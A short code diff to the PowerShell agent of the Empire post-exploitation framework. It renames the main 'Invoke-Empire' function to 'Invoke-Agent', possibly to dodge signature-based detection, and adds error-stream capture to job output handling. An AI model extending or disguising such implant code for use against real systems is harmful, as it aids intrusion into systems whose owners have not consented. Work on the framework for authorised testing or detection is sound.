@@ -1,5 +1,5 @@
 
-function Invoke-Empire {
+function Invoke-Agent {
     <#
         .SYNOPSIS
         The main functionality of the Empire agent.
@@ -441,6 +441,8 @@ function Invoke-Empire {
         param($JobName)
         if($Script:Jobs.ContainsKey($JobName)) {
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
         }
     }
 
@@ -453,6 +455,8 @@ function Invoke-Empire {
             $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
             # get results
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
             # unload the app domain runner
             $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
             $Script:Jobs.Remove($JobName)
